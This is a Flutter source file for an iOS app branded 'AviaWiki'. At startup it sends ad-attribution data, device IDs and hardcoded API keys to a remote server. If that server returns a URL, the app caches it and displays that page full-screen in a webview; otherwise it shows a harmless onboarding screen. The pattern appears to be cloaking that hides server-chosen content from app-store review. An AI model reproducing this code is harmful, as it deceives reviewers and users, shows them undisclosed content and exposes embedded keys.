import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:flutter_asa_attribution/flutter_asa_attribution.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:http/http.dart' as http;

import 'game_screen.dart';

final String onesignalAppId = "d59019a6-1a64-41b3-ae1d-46a9c638cbd9";
final String appsFlyerDevKey = "2tqq6cfzvNG8qw2fS3rjdm";
final String serverUrl = "https://brandonnet.click/aviawiki-tech";
final String appName = 'AviaWikiIOS';
final String bundleId = 'com.aviawiki';
final String appId = '6746484292';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  // await AppTrackingTransparency.requestTrackingAuthorization();
  OneSignal.initialize(onesignalAppId);
  await OneSignal.Notifications.requestPermission(true);
  runApp(GameTimer());
}

class GameTimer extends StatefulWidget {
  const GameTimer({Key? key}) : super(key: key);

  @override
  State<GameTimer> createState() => _GameTimerState();
}

class _GameTimerState extends State<GameTimer> {
  final GlobalKey webViewKey = GlobalKey();
  final dio = Dio();
  DeepLink? _deepLinkResult;
  Map<String, dynamic> _asaData = {};
  Map<String, dynamic> _conversionData = {};

  AppsflyerSdk? _appsFlyerSdk;
  final _dataCompleter = Completer<Map<String, dynamic>>();

  String? _loadUrl;
  bool _urlLoaded = false;
  bool _isInitializing = false;

  @override
  void initState() {
    super.initState();
    _initializeAll();
  }

  Future<void> _fetchAppleSearchAdsData() async {
    try {
      final String? appleSearchAdsToken =
          await FlutterAsaAttribution.instance.attributionToken();
      if (appleSearchAdsToken != null) {
        const url = 'https://api-adservices.apple.com/api/v1/';
        final headers = {'Content-Type': 'text/plain'};
        final response = await http.post(Uri.parse(url),
            headers: headers, body: appleSearchAdsToken);

        if (response.statusCode == 200) {
          _asaData = json.decode(response.body);
        }
      }
    } catch (e) {
      print("ASA Data fetch error: $e");
    }
  }

  Future<void> _initializeAll() async {
    if (_isInitializing) return;
    _isInitializing = true;

    try {
      final prefs = await SharedPreferences.getInstance();
      final storedUrl = prefs.getString('url_answer');

      if (storedUrl != null) {
        _completeDataCompleter({'storedUrl': storedUrl});
        setState(() {
          _loadUrl = storedUrl;
          _urlLoaded = true;
        });
        _isInitializing = false;
        return;
      }

      // await AppTrackingTransparency.requestTrackingAuthorization();
      await _fetchAppleSearchAdsData();
      _dataCompleter.complete({'appsFlyerData': 'No Data'});
      // await _initializeAppsFlyer();
    } catch (e) {
      print("Initialization error: $e");
    }
  }

  void _completeDataCompleter(Map<String, dynamic> data) {
    if (!_dataCompleter.isCompleted) {
      _dataCompleter.complete(data);
    }
  }

  // Future<void> _initializeAppsFlyer() async {
  //   try {
  //     return await Future.any([
  //       _actualAppsFlyerInit(),
  //       Future.delayed(const Duration(seconds: 8), () {
  //         if (!_dataCompleter.isCompleted) {
  //           _dataCompleter.complete({'appsFlyerData': 'No Data'});
  //         }
  //         return;
  //       })
  //     ]);
  //   } catch (e) {
  //     print("AppsFlyer initialization error: $e");
  //     if (!_dataCompleter.isCompleted) {
  //       _dataCompleter
  //           .complete({'error': e.toString(), 'appsFlyerData': 'No Data'});
  //     }
  //   }
  // }

  // Future<void> _actualAppsFlyerInit() async {
  //   final appsFlyerOptions = AppsFlyerOptions(
  //     afDevKey: appsFlyerDevKey,
  //     appId: appId,
  //     timeToWaitForATTUserAuthorization: 15,
  //     showDebug: true,
  //   );

  //   _appsFlyerSdk = AppsflyerSdk(appsFlyerOptions);

  //   await _appsFlyerSdk?.initSdk(
  //     registerConversionDataCallback: true,
  //     registerOnAppOpenAttributionCallback: true,
  //     registerOnDeepLinkingCallback: true,
  //   );

  //   _appsFlyerSdk?.onDeepLinking((DeepLinkResult dp) {
  //     print("Deep linking result: ${dp.status}");
  //     if (dp.status == Status.FOUND) {
  //       _deepLinkResult = DeepLink(dp.deepLink?.clickEvent ?? {});
  //     }
  //   });

  //   _appsFlyerSdk?.onInstallConversionData((response) {
  //     if (!_dataCompleter.isCompleted) {
  //       if (response != null && response['payload'] != null) {
  //         final payload = response['payload'] as Map<String, dynamic>;
  //         Map<String, dynamic> data = {};
  //         payload.forEach((key, value) {
  //           if (value != null) {
  //             data[key] = value;
  //           }
  //         });

  //         if (data.isNotEmpty) {
  //           _dataCompleter.complete({...data});
  //         } else {
  //           _dataCompleter.complete({'appsFlyerData': 'No Data'});
  //         }
  //       } else {
  //         _dataCompleter.complete({'appsFlyerData': 'No Data'});
  //       }
  //     }
  //   });
  // }

  Future<String?> _initializeAndFetchData(Map<String, dynamic> data) async {
    try {
      print("Initialize and fetch data with: $data");
      if (data.containsKey('storedUrl')) {
        return data['storedUrl'];
      }

      final prefs = await SharedPreferences.getInstance();
      String? externalId = prefs.getString('external_id');
      if (externalId == null) {
        externalId = DateTime.now().millisecondsSinceEpoch.toString();
        await prefs.setString('external_id', externalId);
      }
      OneSignal.login(externalId);
      // String appsFlyerUID;
      // try {
      //   appsFlyerUID = await _appsFlyerSdk?.getAppsFlyerUID() ?? '';
      //   print("AppsFlyerUID: $appsFlyerUID");
      // } catch (e) {
      //   print("Error getting AppsFlyer UID: $e");
      //   appsFlyerUID = '';
      // }

      final requestData = {
        "app_id": 'id$appId',
        "app_name": appName,
        "package_id": bundleId,
        // "appsflyer_id": appsFlyerUID,
        "dev_key": appsFlyerDevKey,
        "onesignal_app_id": onesignalAppId,
        "onesignal_external_id": externalId,
        "platform": "ios",
        ...data,
      };

      if (_conversionData.containsKey('payload')) {
        Map<String, dynamic> appsFlyerData = _conversionData['payload'];
        if (appsFlyerData.containsKey('media_source')) {
          String alternateMedium = 'medium';
          if (appsFlyerData['campaign'] != null &&
              appsFlyerData['campaign'].toString().isNotEmpty) {
            String campaignString = appsFlyerData['campaign'].toString();
            List<String> parts = campaignString.split('_');
            alternateMedium = parts.isNotEmpty ? parts[0] : campaignString;
          }
          requestData.addAll({
            'utm_medium': appsFlyerData['af_sub1'] != 'auto' &&
                    appsFlyerData['af_sub1'] != null &&
                    appsFlyerData['af_sub1'].toString().isNotEmpty
                ? appsFlyerData['af_sub1']
                : alternateMedium,
            'utm_content': appsFlyerData['af_sub2'] != 'auto' &&
                    appsFlyerData['af_sub2'] != null &&
                    appsFlyerData['af_sub2'].toString().isNotEmpty
                ? appsFlyerData['af_sub2']
                : (appsFlyerData['campaign']?.toString() ?? 'campaign'),
            'utm_term': appsFlyerData['af_sub3'] != 'auto' &&
                    appsFlyerData['af_sub3'] != null &&
                    appsFlyerData['af_sub3'].toString().isNotEmpty
                ? appsFlyerData['af_sub3']
                : (appsFlyerData['af_ad']?.toString() ?? 'af_ad'),
            'utm_source': appsFlyerData['af_sub4'] != 'auto' &&
                    appsFlyerData['af_sub4'] != null &&
                    appsFlyerData['af_sub4'].toString().isNotEmpty
                ? appsFlyerData['af_sub4']
                : (appsFlyerData['media_source']?.toString() ?? 'media_source'),
            'utm_campaign': appsFlyerData['af_sub5'] != 'auto' &&
                    appsFlyerData['af_sub5'] != null &&
                    appsFlyerData['af_sub5'].toString().isNotEmpty
                ? appsFlyerData['af_sub5']
                : (appsFlyerData['af_adset']?.toString() ?? 'af_adset'),
          });
        }
      }

      // if (_deepLinkResult != null) {
      //   print("Adding deep link data");
      //   requestData.addAll({
      //     'deep_link_value': _deepLinkResult?.deepLinkValue ?? '',
      //     'deep_link_sub1': _deepLinkResult?.deep_link_sub1 ?? '',
      //     'deep_link_sub2': _deepLinkResult?.deep_link_sub2 ?? '',
      //     'deep_link_sub3': _deepLinkResult?.deep_link_sub3 ?? '',
      //     'deep_link_sub4': _deepLinkResult?.deep_link_sub4 ?? '',
      //     'deep_link_sub5': _deepLinkResult?.deep_link_sub5 ?? '',
      //     'match_type': _deepLinkResult?.matchType ?? '',
      //     'is_deferred': _deepLinkResult?.isDeferred ?? false,
      //     'media_source': _deepLinkResult?.mediaSource ?? '',
      //     'click_http_referrer': _deepLinkResult?.clickHttpReferrer ?? '',
      //   });
      // }

      if (_asaData.containsKey('attribution') &&
          _asaData['attribution'] == true) {
        requestData.addAll({
          'adId': _asaData['adId']?.toString() ?? '',
          'conversionType': _asaData['conversionType'] ?? '',
          'keywordId': _asaData['keywordId']?.toString() ?? '',
          'adGroupId': _asaData['adGroupId']?.toString() ?? '',
          'campaignId': _asaData['campaignId']?.toString() ?? '',
        });
      }

      final response = await dio.post(
        serverUrl,
        data: requestData,
        options: Options(
          headers: {"Content-Type": "application/json"},
        ),
      );
      if (response.statusCode == 200) {
        final status = response.data['status'];
        if (status != null && status.toString().isNotEmpty) {
          try {
            final statusResponse = await http.get(WebUri(status));
            if (statusResponse.statusCode == 404) {
              _isInitializing = false;
              return null;
            }

            await prefs.setString('url_answer', status);
            _isInitializing = false;
            return status;
          } catch (e) {
            _isInitializing = false;
            return null;
          }
        }
      }
      _isInitializing = false;
      return null;
    } catch (e) {
      _isInitializing = false;
      return null;
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        primarySwatch: Colors.orange,
        scaffoldBackgroundColor: Colors.black,
        appBarTheme: const AppBarTheme(
          backgroundColor: Colors.black,
          foregroundColor: Colors.white,
        ),
        colorScheme: ColorScheme.dark(
          primary: Colors.orange,
          secondary: Colors.orange,
          background: Colors.black,
        ),
      ),
      home: Scaffold(
        body: FutureBuilder<Map<String, dynamic>>(
            future: _dataCompleter.future,
            builder: (context, dataSnapshot) {
              if (!dataSnapshot.hasData) {
                return LoadingScreen();
              }

              return FutureBuilder<String?>(
                future: _initializeAndFetchData(dataSnapshot.data!),
                builder: (context, urlSnapshot) {
                  if (urlSnapshot.connectionState == ConnectionState.waiting) {
                    return LoadingScreen();
                  } else if (urlSnapshot.hasData && urlSnapshot.data != null) {
                    return SafeArea(
                      bottom: false,
                      child: InAppWebView(
                        initialUrlRequest: URLRequest(
                          url: WebUri(urlSnapshot.data!),
                        ),
                        onWebViewCreated:
                            (InAppWebViewController controller) {},
                        onLoadStart: (controller, url) {},
                        onLoadStop: (controller, url) {},
                        onProgressChanged: (controller, progress) {},
                      ),
                    );
                  } else {
                    return OnboardingScreen();
                  }
                },
              );
            }),
      ),
    );
  }
}

class OnboardingScreen extends StatefulWidget {
  @override
  _OnboardingScreenState createState() => _OnboardingScreenState();
}

class _OnboardingScreenState extends State<OnboardingScreen> {
  final PageController _pageController = PageController();
  int _currentPage = 0;
  final int _totalPages = 3;

  Future<void> _completeOnboarding() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('showOnboarding', false);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          PageView(
            controller: _pageController,
            onPageChanged: (int page) {
              setState(() {
                _currentPage = page;
              });
            },
            children: List.generate(
              _totalPages,
              (index) => Container(
                decoration: BoxDecoration(
                  image: DecorationImage(
                    image: AssetImage('assets/onb/${index + 1}.png'),
                    fit: BoxFit.cover,
                  ),
                ),
              ),
            ),
          ),
          Positioned(
            bottom: 40,
            left: 0,
            right: 0,
            child: Center(
              child: ElevatedButton(
                onPressed: () async {
                  if (_currentPage < _totalPages - 1) {
                    _pageController.nextPage(
                      duration: Duration(milliseconds: 300),
                      curve: Curves.easeInOut,
                    );
                  } else {
                    await _completeOnboarding();
                    Navigator.pushReplacement(
                      context,
                      MaterialPageRoute(builder: (context) => HomeScreen()),
                    );
                  }
                },
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.red,
                  padding: EdgeInsets.symmetric(horizontal: 40, vertical: 15),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(30),
                  ),
                ),
                child: Text(
                  _currentPage == _totalPages - 1 ? 'Enter AviaWiki' : 'Next',
                  style: TextStyle(
                    fontSize: 16,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class DeepLink {
  DeepLink(this._clickEvent);
  final Map<String, dynamic> _clickEvent;

  Map<String, dynamic> get clickEvent => _clickEvent;

  String? get deepLinkValue => _clickEvent["deep_link_value"] as String?;
  String? get matchType => _clickEvent["match_type"] as String?;
  String? get clickHttpReferrer =>
      _clickEvent["click_http_referrer"] as String?;
  String? get mediaSource => _clickEvent["media_source"] as String?;
  String? get deep_link_sub1 => _clickEvent["deep_link_sub1"] as String?;
  String? get deep_link_sub2 => _clickEvent["deep_link_sub2"] as String?;
  String? get deep_link_sub3 => _clickEvent["deep_link_sub3"] as String?;
  String? get deep_link_sub4 => _clickEvent["deep_link_sub4"] as String?;
  String? get deep_link_sub5 => _clickEvent["deep_link_sub5"] as String?;

  bool get isDeferred => _clickEvent["is_deferred"] as bool? ?? false;

  @override
  String toString() {
    return 'DeepLink: ${jsonEncode(_clickEvent)}';
  }

  String? getStringValue(String key) {
    return _clickEvent[key] as String?;
  }
}

class LoadingScreen extends StatelessWidget {
  const LoadingScreen({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Image.asset(
          'assets/loading.png',
          fit: BoxFit.cover,
          width: double.infinity,
          height: double.infinity,
        ),
      ),
    );
  }
}
